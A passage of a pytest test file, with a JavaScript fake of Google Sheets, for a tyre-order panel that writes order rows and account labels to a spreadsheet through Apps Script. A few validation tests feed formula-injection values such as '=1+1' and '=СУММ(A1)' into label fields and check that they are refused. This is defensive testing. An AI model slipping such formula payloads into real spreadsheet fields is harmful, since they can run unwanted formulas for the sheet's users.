    assert events(conn, mine)[-2:] == ["Google-таблица обновлена: Этап.", "Заказ на этапе до «Заказ оформлен»: строки Google-таблицы залиты серым: 2 стр."]
    orders.update_card(conn, mine, {"webmim_number": "777"}, LATER, "owner")   # a change while it stands before: updated, the fill not sent again
    sheet.flush(conn, box, fake, LATER)
    assert all("shade" not in op for op in fake.data_posts()[-1]["rows"]) and {r["№ заказа MIM"] for r in fake.rows.values()} == {"777"}
    orders.move_card(conn, mine, stage(conn, "placed")["id"], LATEST, "owner")
    sheet.flush(conn, box, fake, LATEST)
    assert fake.grey == set() and len(fake.rows) == 2 and {r["Этап"] for r in fake.rows.values()} == {"Заказ оформлен"}
    assert events(conn, mine)[-1] == "Заказ снова оформлен: серая заливка строк Google-таблицы снята: 2 стр."
    assert all(not op["create"] for op in fake.data_posts()[-1]["rows"])   # the same rows, never new ones
    orders.move_card(conn, mine, stage(conn, "cancel")["id"], LATEST, "owner", {"cancel_reason": "передумал"})
    sheet.flush(conn, box, fake, LATEST)                                   # «Отмена» stands after placing: not grey, «Реализация» empty
    assert fake.grey == set() and {(r["Этап"], r["Реализация"]) for r in fake.rows.values()} == {("Отмена", "")}


def test_back_then_cancelled_loses_the_fill_and_its_letter(table):
    conn, box, fake = table
    mine = placed(conn)
    orders.move_card(conn, mine, stage(conn, "oth")["id"], NOW, "owner")
    sheet.flush(conn, box, fake, NOW)
    assert {r["Реализация"] for r in fake.rows.values()} == {"О"}
    orders.move_card(conn, mine, stage(conn, "new")["id"], LATER, "owner")
    sheet.flush(conn, box, fake, LATER)
    assert fake.grey == set(fake.rows) and {r["Реализация"] for r in fake.rows.values()} == {""}
    orders.move_card(conn, mine, stage(conn, "cancel")["id"], LATEST, "owner", {"cancel_reason": "передумал"})
    sheet.flush(conn, box, fake, LATEST)
    assert fake.grey == set() and {r["Этап"] for r in fake.rows.values()} == {"Отмена"}


def test_an_order_back_before_its_first_send_is_written_grey(table):
    conn, box, fake = table
    mine = placed(conn)
    orders.move_card(conn, mine, stage(conn, "new")["id"], LATER, "owner")
    sheet.flush(conn, box, fake, LATER)
    assert len(fake.rows) == 2 and fake.grey == set(fake.rows) and all(op["create"] and op["shade"] is True for op in fake.data_posts()[-1]["rows"])


def test_a_rewritten_row_is_neither_filled_nor_cleared(table):
    conn, box, fake = table
    mine = placed(conn)
    sheet.flush(conn, box, fake, NOW)
    first = sorted(fake.rows)[0]
    fake.rows[first]["Артикул"] = "чужой"
    orders.move_card(conn, mine, stage(conn, "new")["id"], LATER, "owner")
    sheet.flush(conn, box, fake, LATER)
    assert fake.grey == set(fake.rows) - {first} and len(fake.rows) == 2   # the owner's row: untouched
    orders.move_card(conn, mine, stage(conn, "placed")["id"], LATEST, "owner")
    sheet.flush(conn, box, fake, LATEST)
    assert fake.grey == set() and not any(op["key"] == first for op in fake.data_posts()[-1]["rows"])


def test_a_script_that_cannot_fill_is_said_and_retried(table):
    conn, box, fake = table
    fake.legacy = True
    mine = placed(conn)
    sheet.flush(conn, box, fake, NOW)
    orders.move_card(conn, mine, stage(conn, "new")["id"], LATER, "owner")
    sheet.flush(conn, box, fake, LATER)
    assert fake.grey == set() and any("не приняла 2 стр." in e and "новое развертывание Apps Script" in e for e in events(conn, mine))
    assert conn.execute("SELECT failing FROM sheet_order WHERE order_id = ?", (mine,)).fetchone()[0] == 1
    fake.legacy = False                                                    # the owner deployed the new version
    sheet.flush(conn, box, fake, "2026-10-23T12:40:00")
    assert fake.grey == set(fake.rows) and len(fake.rows) == 2
    assert conn.execute("SELECT failing FROM sheet_order WHERE order_id = ?", (mine,)).fetchone()[0] == 0


def test_an_order_before_keep_from_is_left_alone_when_moved_back(table):
    conn, box, fake = table
    mine = placed(conn)
    sheet.flush(conn, box, fake, NOW)
    sheet.save_settings(conn, URL, True, NOW, "owner", keep_from="2026-10-24")
    orders.move_card(conn, mine, stage(conn, "new")["id"], LATER, "owner")
    sheet.flush(conn, box, fake, LATER)
    sheet.flush(conn, box, fake, LATER, full=True)
    assert fake.grey == set() and len(fake.data_posts()) == 1


def test_the_webmim_button_without_the_move_puts_nothing_in(tmp_path, monkeypatch):
    from test_order_placed import panel as placed_panel, ready
    from tires_sync import webmim_create
    app, conn, webmim, avito, box, client = placed_panel.__wrapped__(tmp_path, monkeypatch)
    fake = FakeScript()
    app.config.update(SHEET_HTTP=fake, SHEET_RUN=lambda work: work())
    turn_on(conn, box)
    mine = ready(conn, chat=False)
    monkeypatch.setattr(webmim_create, "_to_placed", lambda *a: ("", "Этап не сменился (остался «Новый заказ»): проверка. Переведите заказ сами."))
    assert post(client, "/orders/%d/webmim/create" % mine, "tok").status_code == 302
    assert orders.get_card(conn, mine)["webmim_id"] and orders.get_card(conn, mine)["stage"]["code"] == "new"
    assert conn.execute("SELECT 1 FROM sheet_order WHERE order_id = ?", (mine,)).fetchone() is None and fake.rows == {}
    orders.move_card(conn, mine, stage(conn, "placed")["id"], LATER, "owner")          # moved by hand later: in
    sheet.flush(conn, box, fake, LATER)
    assert len(fake.rows) == 2


# ---- «Аккаунт» (the owner 2026-11-02) ----------------------------------------------------------------------------------------------------

def account(conn, name, label=""):
    found = connections.create_account(conn, name, NOW, "owner")
    connections.set_sheet_label(conn, found, label, NOW, "owner")
    conn.commit()
    return found


def chat_of(conn, account_id, order_id, chat="c-1"):
    conn.execute("INSERT INTO avito_chat (account_id, chat_id, peer_name, last_at, order_id) VALUES (?, ?, 'Иван', ?, ?)", (account_id, chat, NOW, order_id))
    conn.commit()


def test_the_account_column_is_the_label_of_the_order_s_account(table):
    conn, box, fake = table
    first, second, bare = account(conn, "Основной", "Павел"), account(conn, "Шина-Колесо", "Заман"), account(conn, "Третий")
    by_chat, by_call, unlabelled, alone = placed(conn), placed(conn, client_name="Пётр"), placed(conn, client_name="Олег"), placed(conn, client_name="Ира")
    chat_of(conn, second, by_chat)
    chat_of(conn, first, by_chat, "c-2")                                   # a later chat of another account: the first one counts
    conn.execute("INSERT INTO avito_call (account_id, call_id, call_at, order_id) VALUES (?, 7, ?, ?)", (first, NOW, by_call))
    chat_of(conn, bare, unlabelled, "c-3")
    labels = {c: {r["Аккаунт"] for r in sheet.rows_of(conn, c, NOW).values()} for c in (by_chat, by_call, unlabelled, alone)}
    assert labels == {by_chat: {"Заман"}, by_call: {"Павел"}, unlabelled: {""}, alone: {""}}
    sheet.flush(conn, box, fake, NOW)
    assert {r["Аккаунт"] for k, r in fake.rows.items() if k.startswith("tires:%d:" % by_chat)} == {"Заман"}
    assert all("Аккаунт" not in r for k, r in fake.rows.items() if k.startswith("tires:%d:" % alone))     # an empty label: never sent
    assert all("Аккаунт" not in op["fields"] for p in fake.data_posts() for op in p["rows"])              # always apart, in «extra»
    connections.set_sheet_label(conn, second, "Заман К.", LATER, "owner")
    orders.update_card(conn, by_chat, {"comment": "x"}, LATER, "owner")
    sheet.flush(conn, box, fake, LATER)
    assert {r["Аккаунт"] for k, r in fake.rows.items() if k.startswith("tires:%d:" % by_chat)} == {"Заман К."}
    assert events(conn, by_chat)[-1] == "Google-таблица обновлена: Аккаунт."
    assert "Павел" not in str(orders.get_card(conn, by_call))              # only the table has it


def test_the_label_is_typed_on_the_account_page(panel):
    app, conn, box, fake, client = panel
    mine = connections.create_account(conn, "Основной", NOW, "owner")
    conn.commit()
    assert "Подпись в таблице заказов" in client.get("/connections/avito/%d" % mine).get_data(as_text=True)
    assert post(client, "/connections/accounts/%d/sheet-label" % mine, "tok", sheet_label="  Павел ").status_code == 302
    assert connections.get_sheet_label(conn, mine) == "Павел" and 'value="Павел"' in client.get("/connections/avito/%d" % mine).get_data(as_text=True)
    post(client, "/connections/accounts/%d/sheet-label" % mine, "tok", sheet_label="")
    assert connections.get_sheet_label(conn, mine) == ""
    with pytest.raises(ValueError):
        connections.set_sheet_label(conn, mine, "x" * 41, NOW, "owner")


# ---- «Аккаунт»: the responsible first (the owner 2026-11-05) ---------------------------------------------------------------------------

def responsible_of(conn, order_id, login, created_by=None):
    conn.execute("UPDATE order_card SET responsible = ? WHERE id = ?", (login, order_id))
    if created_by is not None:
        conn.execute("UPDATE order_card SET created_by = ? WHERE id = ?", (created_by, order_id))
    conn.commit()


def label_of(conn, order_id):
    labels = {r["Аккаунт"] for r in sheet.rows_of(conn, order_id, NOW).values()}
    assert len(labels) == 1
    return labels.pop()


def person_with_label(conn, login, label, role="partner"):
    users.add_user(conn, login, "пароль-для-теста-1", NOW, role=role)
    users.set_sheet_label(conn, login, label, NOW, "owner")


def test_the_label_of_the_responsible_goes_before_the_account_s(table):
    conn, box, fake = table
    person_with_label(conn, "person1", "Подпись-А")
    users.set_sheet_label(conn, "owner", "Подпись-Б", NOW, "owner", main_login="owner")
    by_account = account(conn, "Основной", "Подпись-Акк")
    order = placed(conn)
    chat_of(conn, by_account, order)
    responsible_of(conn, order, "person1")
    assert label_of(conn, order) == "Подпись-А"                          # they differ: the responsible wins
    alone = placed(conn, client_name="Пётр")
    responsible_of(conn, alone, "person1")
    assert label_of(conn, alone) == "Подпись-А"                          # no account at all: the responsible still names the row
    main = placed(conn, client_name="Олег")
    responsible_of(conn, main, "owner")
    assert label_of(conn, main) == "Подпись-Б"                          # the main login is no panel user and has its label too


def test_a_responsible_without_a_label_leaves_the_account_s_label(table):
    conn, box, fake = table
    users.add_user(conn, "point_login", "пароль-для-теста-1", NOW, role="partner")
    by_account = account(conn, "Основной", "Подпись-Акк")
    order, bare = placed(conn), placed(conn, client_name="Пётр")
    chat_of(conn, by_account, order)
    responsible_of(conn, order, "point_login")
    responsible_of(conn, bare, "point_login")
    assert label_of(conn, order) == "Подпись-Акк"
    assert label_of(conn, bare) == ""                                      # no label of anybody: empty


def test_an_empty_responsible_reads_as_the_panel_shows_it(table):
    conn, box, fake = table
    person_with_label(conn, "person1", "Подпись-А")
    by_account = account(conn, "Основной", "Подпись-Акк")
    nobody, nobody_bare, maker = placed(conn), placed(conn, client_name="Пётр"), placed(conn, client_name="Олег")
    chat_of(conn, by_account, nobody)
    responsible_of(conn, nobody, "", created_by="")
    responsible_of(conn, nobody_bare, "", created_by="")
    assert label_of(conn, nobody) == "Подпись-Акк" and label_of(conn, nobody_bare) == ""
    responsible_of(conn, maker, "", created_by="person1")                   # orders.get_card: whoever made the card answers for it
    assert orders.get_card(conn, maker)["responsible"] == "person1" and label_of(conn, maker) == "Подпись-А"


def test_a_point_or_a_client_has_no_label_even_after_a_change_of_role(table):
    conn, box, fake = table
    pid = point(conn)
    person_with_label(conn, "person1", "Подпись-А")
    by_account = account(conn, "Основной", "Подпись-Акк")
    order = placed(conn)
    chat_of(conn, by_account, order)
    responsible_of(conn, order, "person1")
    assert label_of(conn, order) == "Подпись-А"
    users.set_role(conn, "person1", "point", pid, "", NOW, "owner")
    assert users.get_sheet_label(conn, "person1") == "" and label_of(conn, order) == "Подпись-Акк"
    with pytest.raises(users.UserError):
        users.set_sheet_label(conn, "person1", "Подпись-В", NOW, "owner")
    users.set_role(conn, "person1", "client", None, "", NOW, "owner")
    assert users.get_sheet_label(conn, "person1") == ""
    with pytest.raises(users.UserError):
        users.set_sheet_label(conn, "person1", "Подпись-В", NOW, "owner")


def test_the_row_follows_the_responsible_and_the_label_of_a_person(table):
    conn, box, fake = table
    person_with_label(conn, "person1", "Подпись-А")
    person_with_label(conn, "person2", "Подпись-Б")
    order = placed(conn)
    responsible_of(conn, order, "person1")
    sheet.flush(conn, box, fake, NOW)
    mine = lambda: {r["Аккаунт"] for k, r in fake.rows.items() if k.startswith("tires:%d:" % order)}
    assert mine() == {"Подпись-А"}
    orders.update_card(conn, order, {"responsible": "person2"}, LATER, "owner")     # a written row: «Аккаунт» goes in «extra», the journal names it
    sheet.flush(conn, box, fake, LATER)
    assert mine() == {"Подпись-Б"} and events(conn, order)[-1] == "Google-таблица обновлена: Аккаунт."
    assert all("Аккаунт" not in op["fields"] for p in fake.data_posts() for op in p["rows"])
    users.set_sheet_label(conn, "person2", "Подпись-В", LATER, "owner")             # no record in the journal: the hourly look finds it
    sheet.flush(conn, box, fake, LATER)
    assert mine() == {"Подпись-Б"}
    sheet.flush(conn, box, fake, LATER, full=True)
    assert mine() == {"Подпись-В"}


def test_the_label_of_a_person_is_checked_like_the_account_s(table):
    conn, box, fake = table
    users.add_user(conn, "person1", "пароль-для-теста-1", NOW, role="partner")
    assert users.get_sheet_label(conn, "person1") == "" and users.get_sheet_label(conn, "") == ""       # empty by default
    users.set_sheet_label(conn, "PERSON1", "  Два   слова ", NOW, "owner")
    assert users.get_sheet_label(conn, "person1") == "Два слова" and users.get_sheet_label(conn, "Person1") == "Два слова"
    for wrong in ("x" * 41, "=СУММ(A1)", "a\x01b"):
        with pytest.raises(users.UserError):
            users.set_sheet_label(conn, "person1", wrong, NOW, "owner")
    assert users.get_sheet_label(conn, "person1") == "Два слова"
    with pytest.raises(users.UserError):
        users.set_sheet_label(conn, "nobody", "Кто-то", NOW, "owner")      # a login that is nobody's
    assert users.get_sheet_label(conn, "nobody") == ""
    users.set_sheet_label(conn, "person1", "", NOW, "owner")
    assert users.get_sheet_label(conn, "person1") == ""


def test_the_label_follows_a_new_login_and_goes_with_the_user(table):
    conn, box, fake = table
    person_with_label(conn, "person1", "Подпись-А")
    users.rename_login(conn, "person1", "person2")
    conn.commit()
    assert users.get_sheet_label(conn, "person2") == "Подпись-А" and users.get_sheet_label(conn, "person1") == ""
    users.remove_user(conn, "person2", NOW)
    conn.commit()
    users.add_user(conn, "person2", "пароль-для-теста-1", NOW, role="partner")
    assert users.get_sheet_label(conn, "person2") == ""                     # somebody else under the old name does not inherit it


def test_the_owner_types_the_label_of_a_person_and_of_the_main_login(panel):
    app, conn, box, fake, client = panel
    users.add_user(conn, "person1", "пароль-для-теста-1", NOW, role="partner")
    page = client.get("/users").get_data(as_text=True)
    assert 'action="/users/person1/sheet-label"' in page and 'action="/users/owner/sheet-label"' in page
    assert post(client, "/users/person1/sheet-label", "tok", sheet_label="Подпись-А").status_code == 302
    assert post(client, "/users/owner/sheet-label", "tok", sheet_label="Подпись-Б").status_code == 302
    assert users.get_sheet_label(conn, "person1") == "Подпись-А" and users.get_sheet_label(conn, "owner") == "Подпись-Б"
    page = client.get("/users").get_data(as_text=True)
    assert 'value="Подпись-А"' in page and 'value="Подпись-Б"' in page
    assert post(client, "/users/person1/sheet-label", "tok", sheet_label="=1+1").status_code == 302     # refused: said, nothing changed
    assert users.get_sheet_label(conn, "person1") == "Подпись-А"
    assert post(client, "/users/nobody/sheet-label", "tok", sheet_label="Кто-то").status_code == 302
    assert users.get_sheet_label(conn, "nobody") == ""
    assert "Подпись в таблице заказов у «person1»" in client.get("/history").get_data(as_text=True)


@pytest.mark.parametrize("role", ["partner", "chats", "point", "viewer", "client"])
def test_nobody_but_the_owner_sets_or_reads_the_label_of_a_person(tmp_path, role):
    from tires_sync import order_points as points
    app = make_app(tmp_path)
    conn = store.connect(app.config["DB_PATH"])
    orders.ensure_pipeline(conn, NOW)
    pid = points.save_point(conn, {"name": "Альфа", "manager_name": "А", "channel": "panel"}) if role == "point" else None
    users.add_user(conn, "person1", "пароль-для-теста-1", NOW, role="partner")
    users.set_sheet_label(conn, "person1", "Подпись-А", NOW, "owner")
    users.set_sheet_label(conn, "owner", "Подпись-Б", NOW, "owner", main_login="owner")
    order = orders.create_card(conn, {"client_name": "Иван", "client_phone": "+79001112233", "point_id": pid}, NOW, "owner")
    responsible_of(conn, order, "person1")
    client, _ = person(app, role, pid)
    with client.session_transaction() as session:
        session["csrf"] = "tok"
    r = client.post("/users/person1/sheet-label", data={"csrf": "tok", "sheet_label": "Чужой"})
    assert r.status_code in (302, 403) and users.get_sheet_label(conn, "person1") == "Подпись-А"
    for path in ("/users", "/history", "/orders", "/orders/%d" % order, "/my-point", "/my-point/orders/%d" % order):
        text = client.get(path, follow_redirects=True).get_data(as_text=True)
        assert "Подпись-А" not in text and "Подпись-Б" not in text, path


def test_the_label_of_a_person_is_only_in_the_table(panel):
    app, conn, box, fake, client = panel
    orders.ensure_pipeline(conn, NOW)
    person_with_label(conn, "person1", "Подпись-А")
    order = placed(conn)
    responsible_of(conn, order, "person1")
    for path in ("/orders", "/orders/%d" % order):
        assert "Подпись-А" not in client.get(path, follow_redirects=True).get_data(as_text=True), path
    assert "Подпись-А" not in str(orders.get_card(conn, order))


def test_a_sheet_without_the_account_column_takes_the_rows_and_the_check_warns(table):
    conn, box, fake = table
    fake.columns = [c for c in fake.columns if c != "Аккаунт"]
    labelled = account(conn, "Основной", "Павел")
    mine = placed(conn)
    chat_of(conn, labelled, mine)
    sheet.flush(conn, box, fake, NOW)
    assert len(fake.rows) == 2 and all("Аккаунт" not in r for r in fake.rows.values())
    assert events(conn, mine) == ["Записано в Google-таблицу: 2 стр."]
    said = sheet.check(conn, box, fake)
    assert said.startswith("Таблица отвечает") and "Нет колонки «Аккаунт»" in said
    assert fake.posts[-1]["optional"] == ["Аккаунт"] and "Строк с меткой" not in said     # an older script: no word of the marks
    fake.marks = {"marked": 2, "moved": 0, "blocked": 0, "filter_outside": True, "optional": True}
    said = sheet.check(conn, box, fake)                                    # the script of 2026-11-02 looks at the marks all the same
    assert "Нет колонки «Аккаунт»" in said and "Строк с меткой (скрытая колонка «tires_id»): 2" in said and "Фильтр на листе" in said
    fake.columns.remove("ПВЗ")
    with pytest.raises(sheet.SheetError, match="нет колонок: ПВЗ.$"):          # a needed column is an error, «Аккаунт» never is
        sheet.check(conn, box, fake)


def test_an_update_carries_the_cells_that_identify_the_row_and_a_rewritten_row_is_left_alone(table):
    conn, box, fake = table
    mine = placed(conn)
    sheet.flush(conn, box, fake, NOW)
    first = sorted(fake.rows)[0]
    fake.rows[first]["Артикул"] = "чужой"                                   # the owner wrote another tyre into the row
    orders.move_card(conn, mine, stage(conn, "at_point")["id"], LATER, "pavel")
    sheet.flush(conn, box, fake, LATER)
    sent = fake.data_posts()[-1]["rows"]
    assert [r["check"] for r in sent] == [{"Артикул": "111", "Телефон": "89111112233"}, {"Артикул": "222", "Телефон": "89111112233"}]
                                                                           # the code and the phone (the lead's review 2026-11-01)
    assert fake.rows[first]["Этап"] == "Заказ оформлен" and fake.rows[sorted(fake.rows)[1]]["Этап"] == "На точке, ждём клиента"
    assert any("Строка Google-таблицы изменена или удалена вручную" in e for e in events(conn, mine))


def test_a_name_the_owner_corrected_keeps_the_row_up_to_date(table):
    conn, box, fake = table
    mine = placed(conn)
    sheet.flush(conn, box, fake, NOW)
    for row in fake.rows.values():
        row["Наименование"] = "Шина (поправил владелец)"
    orders.move_card(conn, mine, stage(conn, "at_point")["id"], LATER, "pavel")
    sheet.flush(conn, box, fake, LATER)
    assert {r["Этап"] for r in fake.rows.values()} == {"На точке, ждём клиента"}
    assert {r["Наименование"] for r in fake.rows.values()} == {"Шина (поправил владелец)"}          # written once: the correction stays


def test_one_broken_order_does_not_stop_the_others(table, monkeypatch):
    conn, box, fake = table
    broken, fine = placed(conn), placed(conn, client_name="Пётр")
    real = sheet.rows_of
    def rows_of(conn_, card_id, placed_at):
        if card_id == broken:
            raise KeyError("сломано")
        return real(conn_, card_id, placed_at)
    monkeypatch.setattr(sheet, "rows_of", rows_of)
    done = sheet.flush(conn, box, fake, NOW)
    assert done[broken].startswith("ошибка: сбой панели (KeyError)") and "Записано" in done[fine]
    assert conn.execute("SELECT failing, next_at FROM sheet_order WHERE order_id = ?", (broken,)).fetchone() == (1, "2026-10-23T12:01:00")
    assert events(conn, broken) == ["Ошибка Google-таблицы: сбой панели (KeyError): сообщите разработчику."]


def test_the_hourly_look_skips_old_orders_but_not_failing_ones(table):
    conn, box, fake = table
    old, failing, fresh = placed(conn), placed(conn, client_name="Б"), placed(conn, client_name="В")
    sheet.flush(conn, box, fake, NOW)
    conn.execute("UPDATE sheet_order SET placed_at = '2026-09-01T10:00:00' WHERE order_id IN (?, ?)", (old, failing))
    conn.execute("UPDATE sheet_order SET failing = 1 WHERE order_id = ?", (failing,))
    conn.commit()
    assert set(sheet.flush(conn, box, fake, LATER, full=True)) == {failing, fresh}


def test_a_change_made_while_google_answers_goes_with_the_next_send(table):
    conn, box, fake = table
    mine = placed(conn)
    other = store.connect(conn.execute("PRAGMA database_list").fetchone()[2])
    real = fake.__call__
    def slow(method, url, headers, body):
        if method == "POST" and len(fake.data_posts()) == 0:
            orders.move_card(other, mine, stage(conn, "at_point")["id"], NOW, "pavel")      # a manager moves it during the send
        return real(method, url, headers, body)
    sheet.flush(conn, box, slow, NOW)
    assert {r["Этап"] for r in fake.rows.values()} == {"Заказ оформлен"}
    sheet.flush(conn, box, fake, LATER)                                     # the next kick, not the hourly look
    assert {r["Этап"] for r in fake.rows.values()} == {"На точке, ждём клиента"}


def test_a_new_address_wants_the_secret_again(panel):
    app, conn, box, fake, client = panel
    turn_on(conn, box)
    other = "https://script.google.com/macros/s/AKfycbOTHER_0987654321xyz/exec"
    client.post("/connections/sheet", data={"csrf": "tok", "url": other, "secret": "", "enabled": "1"})
    assert sheet.settings(conn)["url"] == URL
    client.post("/connections/sheet", data={"csrf": "tok", "url": other, "secret": "новый-секрет-1234567890", "enabled": "1"})
    assert sheet.settings(conn)["url"] == other and connections.get_secret(conn, box, sheet.KIND, 0, "secret") == "новый-секрет-1234567890"
    client.post("/connections/sheet", data={"csrf": "tok", "url": other, "secret": "", "enabled": ""})       # the same address: the secret stays
    assert not sheet.settings(conn)["enabled"] and connections.get_secret(conn, box, sheet.KIND, 0, "secret") == "новый-секрет-1234567890"
    client.post("/connections/sheet", data={"csrf": "tok", "url": "", "secret": "", "enabled": ""})          # cleared, then a third address
    assert sheet.settings(conn)["url"] == ""
    third = "https://script.google.com/macros/s/AKfycbTHIRD_1111111111aaa/exec"
    client.post("/connections/sheet", data={"csrf": "tok", "url": third, "secret": "", "enabled": "1"})
    assert sheet.settings(conn)["url"] == ""                                                               # still wants the secret


def test_the_secret_goes_only_to_the_address_it_was_typed_for(table):
    conn, box, fake = table
    placed(conn)
    config = dict(sheet.settings(conn), url="https://script.google.com/macros/s/AKfycbOTHER_0987654321xyz/exec")
    connections.set_config(conn, sheet.KIND, 0, config, NOW, "owner")                     # however the address changed
    conn.commit()
    assert sheet.flush(conn, box, fake, NOW) == {} and fake.posts == []
    with pytest.raises(sheet.SheetError, match="для этого адреса"):
        sheet.check(conn, box, fake)


# ---- the script run in node on a fake of Google Sheets ---------------------------------------------------------------------------------

HARNESS = r"""
var SECRET = 'S-1';
function Sheet(header, maxRows) {
  this.cells = [header.slice()]; this.notes = {}; this.valid = {}; this.formats = {}; this.maxRows = maxRows; this.raw = {}; this.formulas = {};
}
var SHEET_IDS = 0;
Sheet.prototype.width = function () { return this.cells[0].length; };
Sheet.prototype.getSheetId = function () { if (!this.id) this.id = ++SHEET_IDS; return this.id; };
Sheet.prototype.get = function (r, c) { var row = this.cells[r - 1]; return row && row[c - 1] !== undefined ? row[c - 1] : ''; };
Sheet.prototype.set = function (r, c, v) {
  if (this.onSet) { var hook = this.onSet; this.onSet = null; hook(); }    // the owner's hand in the sheet while the script writes
  if (r > this.maxRows) throw new Error('Координаты диапазона находятся за пределами таблицы');
  while (this.cells.length < r) this.cells.push(new Array(this.width()).fill(''));
  this.raw[r + ',' + c] = v;
  if (typeof v === 'string' && v.charAt(0) === "'") v = v.slice(1);
  else if (typeof v === 'string' && this.formats[r + ',' + c] === '@' && v.charAt(0) !== '=') { /* «обычный текст»: not parsed */ }
  else if (typeof v === 'string' && /^[=+\-@]/.test(v)) { this.formulas[r + ',' + c] = v; v = 'FORMULA(' + v + ')'; }
  else if (typeof v === 'string' && this.formats[r + ',' + c] !== '@' && /^\d+$/.test(v) && v.charAt(0) !== '0') v = Number(v);   // as Google: a
  // number-looking text in a cell not «обычный текст» becomes a number (a leading zero would be lost: never taken as text then)
  this.cells[r - 1][c - 1] = v;
};
Sheet.prototype.formula = function (r, c, f) { this.set(r, c, ''); this.formulas[r + ',' + c] = f; };   // a formula that shows nothing
Sheet.prototype.getLastColumn = function () { return this.width(); };
Sheet.prototype.getLastRow = function () {                          // as Google counts it: a value or a formula (even one that shows nothing)
  var self = this;
  for (var r = this.cells.length; r >= 1; r--) {
    if (this.cells[r - 1].some(function (v, j) { return v !== '' || self.formulas[r + ',' + (j + 1)]; })) return r;
  }
  return 0;
};
Sheet.prototype.getMaxRows = function () { return this.maxRows; };
Sheet.prototype.insertRowsAfter = function (after, n) { this.maxRows += n; };

Sheet.prototype.getMaxColumns = function () { return this.maxCols || this.width(); };
Sheet.prototype.insertColumnsAfter = function (after, n) { this.maxCols = this.getMaxColumns() + n; };
Sheet.prototype.hideColumns = function (c) { (this.hidden = this.hidden || []).push(c); };
Sheet.prototype.getFilter = function () {                             // a filter made before «tires_id» came: columns 1..filterTo
  var to = this.filterTo;
  return to ? {getRange: function () { return {getColumn: function () { return 1; }, getLastColumn: function () { return to; }}; }} : null;
};
Sheet.prototype.keyAt = function (key) {                              // the row whose hidden «tires_id» holds `key`
  var c = this.cells[0].indexOf('tires_id') + 1;
  for (var r = 2; r <= this.cells.length; r++) if (c && this.get(r, c) === key) return r;
  return 0;
};
Sheet.prototype.sortBy = function (c, desc) {                        // what the owner's sort does: the cells and their notes move together
  var self = this, body = [];
  var w = this.width();
  for (var r = 2; r <= this.cells.length; r++) {
    var notes = [], fs = []; for (var j = 1; j <= w; j++) { notes.push(this.notes[r + ',' + j] || ''); fs.push(this.formulas[r + ',' + j] || ''); }
    body.push({cells: this.cells[r - 1], notes: notes, fs: fs});
  }
  body.sort(function (a, b) { var x = String(a.cells[c - 1]), y = String(b.cells[c - 1]); return (x < y ? -1 : x > y ? 1 : 0) * (desc ? -1 : 1); });
  body.forEach(function (row, i) { self.cells[i + 1] = row.cells; row.notes.forEach(function (n, j) { self.notes[(i + 2) + ',' + (j + 1)] = n; });
    row.fs.forEach(function (f, j) { self.formulas[(i + 2) + ',' + (j + 1)] = f; }); });
};
Sheet.prototype.getRange = function (r, c, nr, nc) {
  var sheet = this;
  if (typeof r === 'string') throw new Error('A1 ranges are not used');
  nr = nr || 1; nc = nc || 1;
  function grid(f) { var out = []; for (var i = 0; i < nr; i++) { var row = []; for (var j = 0; j < nc; j++) row.push(f(r + i, c + j)); out.push(row); } return out; }
  return {
    getValues: function () { return grid(function (i, j) { return sheet.get(i, j); }); },
    getDisplayValues: function () { return grid(function (i, j) { return String(sheet.get(i, j)); }); },
    getFormulas: function () { return grid(function (i, j) { return sheet.formulas[i + ',' + j] || ''; }); },
    getValue: function () { return sheet.get(r, c); },
    getFormula: function () { return sheet.formulas[r + ',' + c] || ''; },
    getNotes: function () { return grid(function (i, j) { return sheet.notes[i + ',' + j] || ''; }); },
    setNote: function (v) { sheet.notes[r + ',' + c] = v; return this; },
    setNotes: function (rows) { rows.forEach(function (row, i) { row.forEach(function (v, j) { sheet.notes[(r + i) + ',' + (c + j)] = v; }); }); return this; },
    setValues: function (rows) { rows.forEach(function (row, i) { row.forEach(function (v, j) { sheet.set(r + i, c + j, v); }); }); return this; },
    setValue: function (v) { sheet.set(r, c, v); return this; },
    setBackground: function (color) { for (var i = 0; i < nr; i++) for (var j = 0; j < nc; j++) {
      (sheet.bg = sheet.bg || {})[(r + i) + ',' + (c + j)] = color; } return this; },
    getDataValidation: function () { return sheet.valid[r + ',' + c] || null; },
    insertCheckboxes: function () { sheet.valid[r + ',' + c] = 'checkbox'; return this; },
    setNumberFormat: function (f) { for (var i = 0; i < nr; i++) for (var j = 0; j < nc; j++) sheet.formats[(r + i) + ',' + (c + j)] = f; return this; }
  };
};
var COLS = %(columns)s;
var header = COLS.slice().reverse().concat(['Комментарий владельца']);      // the owner's own order and an extra column of his
var sheet = new Sheet(header, 6);
var col = {}; header.forEach(function (n, i) { col[n] = i + 1; });
sheet.set(2, col['Имя'], "'Ручная строка"); sheet.set(2, col['Артикул'], "'M1");        // a row of the owner, no note
sheet.set(3, col['Комментарий владельца'], "'Итого");                                    // the owner's line «Итого» in his own column
sheet.set(3, col['Сумма продажи'], '=SUM(K2:K2)');
sheet.formula(4, col['Прибыль ₽'], '=IF(K4="";"";K4)');                                  // a formula that shows nothing: still taken
sheet.set(5, col['Примечание'], "'Заберут 02/08");                                       // a note of the owner alone in its row
sheet.set(6, col['Списание'], false);                                                    // a checkbox dragged down: not a filled row
var second = new Sheet(header, 2);                                         // another sheet: its last taken row is a formula that shows nothing
second.formula(2, col['Прибыль ₽'], '=IF(K2="";"";K2)');
var Book = {getSheetByName: function (n) { return n === 'Заказы' ? sheet : n === 'Второй' ? second : null; }};
var SpreadsheetApp = {getActiveSpreadsheet: function () { return Book; }, flush: function () {},
                      getUi: function () { throw new Error('Cannot call SpreadsheetApp.getUi() from this context'); }};
var probes = [];
Book.insertSheet = function (name) { var made = new Sheet(['x'], 20); probes.push(name); return made; };
Book.deleteSheet = function () { probes.push('deleted'); };
var PROPS = {SECRET: SECRET};
var PropertiesService = {getScriptProperties: function () { return {getProperty: function (k) { return k in PROPS ? PROPS[k] : null; },
                                                                    setProperty: function (k, v) { PROPS[k] = v; }}; }};
var LockService = {getScriptLock: function () { return {tryLock: function () { return true; }, releaseLock: function () {}}; }};
var Logger = {log: function () {}};
var ContentService = {MimeType: {JSON: 'json'}, createTextOutput: function (t) { return {text: t, setMimeType: function () { return this; }}; }};
%(script)s
function post(body) { return JSON.parse(doPost({postData: {contents: JSON.stringify(body)}}).text); }
function fields(art, name, client) {
  var f = {}; COLS.forEach(function (c) { f[c] = ''; });
  f['Дата счета'] = '2026-10-23'; f['Артикул'] = art; f['Наименование'] = name; f['Имя'] = client; f['Телефон'] = '+7 911 111-22-33';
